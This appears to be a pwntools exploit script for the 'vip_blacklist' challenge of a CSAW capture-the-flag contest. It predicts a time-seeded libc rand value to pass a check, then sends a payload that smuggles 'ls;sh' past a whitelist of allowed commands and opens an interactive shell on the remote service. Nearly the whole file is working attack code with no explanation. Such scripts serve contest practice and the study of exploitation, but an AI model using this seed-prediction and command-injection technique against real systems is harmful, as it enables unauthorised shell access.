#!/usr/bin/python3

from pwn import *
from ctypes import *
exe = ELF('vip_blacklist', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libcc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # brva 0x19B0
                # brva 0x14A1
                brva 0x1551
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('vip-blacklist.ctf.csaw.io',9999)
    libcc.srand(int(time.time()))
    
else:
    p = process(exe.path)

res = b''
for i in range(10):
    res += p8(libcc.rand() & 0xff)
# print(v4[0])
GDB()
p.recvuntil(b'exit ls')
sl(res)
sa(b'enter', b'queue\0clear\0exit\0\0ls;sh\0')
p.interactive()
